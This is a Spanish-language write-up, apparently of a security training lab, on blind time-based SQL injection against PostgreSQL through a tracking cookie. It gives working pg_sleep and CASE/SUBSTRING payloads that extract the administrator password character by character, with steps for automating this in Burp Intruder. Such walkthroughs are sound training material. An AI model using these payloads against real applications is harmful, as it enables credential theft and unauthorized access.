## Objetivo:

![[Pasted image 20240626225333.png]]

## Solución:

Entramos a cualquier parte de la aplicacion y enviamos la petición al repeater y nos centraremos en la cookie de "TrackingId" y ahí haremos las inyecciones.

Suponiendo que la query interna esta hecha de esta manera intentaremos hacer algunas inyecciones...

```
SELECT * FROM tracking WHERE trackingId = 'kW0sOVsgz3KPbI8H';
```

Intentaremos con esta y veremos a ver si se tarda los 5 segundos en responder el servidor y caso de que así sea pues ya vemos que es vulnerable a Inyeccion a Ciegas

```
kW0sOVsgz3KPbI8H'%3b SELECT pg_sleep(5) -- -
```

Ahora intentaremos con alguna query condicional

```
kW0sOVsgz3KPbI8H'; SELECT CASE WHEN (1=1) THEN pg_sleep(4) ELSE NULL END -- -

kW0sOVsgz3KPbI8H'; SELECT CASE WHEN (1=1) THEN pg_sleep(4) ELSE NULL END -- -
```

Y notaremos dependiendo de una de estas 2 querys anteriores que le enviemos se tardara 4 segundos o respondera inmediatamente el servidor...

Ya con esto podriamos crear una query definitiva siempre usando la tecnica del SUBSTRING. Para probarla podriamos usar esta inyeccion

```
kW0sOVsgz3KPbI8H'%3b SELECT CASE WHEN ((SUBSTRING('hola', 1, 1))='h') THEN pg_sleep(4) ELSE NULL END -- -
```

Ahora bien, toca adivinar la contraseña de una vez por todas...

```
kW0sOVsgz3KPbI8H'%3b SELECT CASE WHEN ((SUBSTRING((SELECT password FROM users WHERE username = 'administrator'), 1, 1))='h') THEN pg_sleep(4) ELSE NULL END -- -
```

Enviaremos la peticion con esta query al Intruder, configuramos las variables y seleccionamos ataque de tipo Cluster Bomb

![[Pasted image 20240626231710.png]]

Configuramos los 2 Payloads y desmarcamos url encoded

![[Pasted image 20240626232149.png]]

![[Pasted image 20240626232209.png]]

Y comenzamos el ataque, y hay que estar muy pendiente de cada Request que se envia y en cual de ellas se queda pegada por aproximadamente 4 segundos o los que le pusiste, y ahi pues ya tenes "un caracter" de la contraseña del usuario...

Igual para concentrarte mejor en los timings podes hacer esta configuracion en el intruder

![[Pasted image 20240626232342.png]]

Y así tenes una peticion nada mas a la vez y es una por segundo...

O si no te queres calentar la cabeza te podes guiar de la columna Response Completed del Burp y filtralo por los numeros mas altos y si pusiste por ejemplo un Sleep de 8 segundos, lo mas problable es que tengas varios 8000 o mayores a eso y basandote en eso ya podes intuir que esos payloads son los caracteres de la contraseña, y claro tambien fijate en el orden del Payloads #1, porque si notás hay por ejemplo hay dos que dicen "3, 1", entonces luego al encontrarte con casos así solo fijate en el Response Completed y el que más tardó en responder es el indicado...

(En este caso yo entre a Burp Profesional y cambie la query a un sleep de 8 para hacer mas notorio el Response Completed, metele numeros arriba de 7 en el Sleep si podes...)

![[Pasted image 20240626233600.png]]

Siguiendo esto la contraseña quedaría como ***eynyayyrvgpqbnbtitn8***
Luego iniciamos sesión

![[Pasted image 20240626233930.png]]

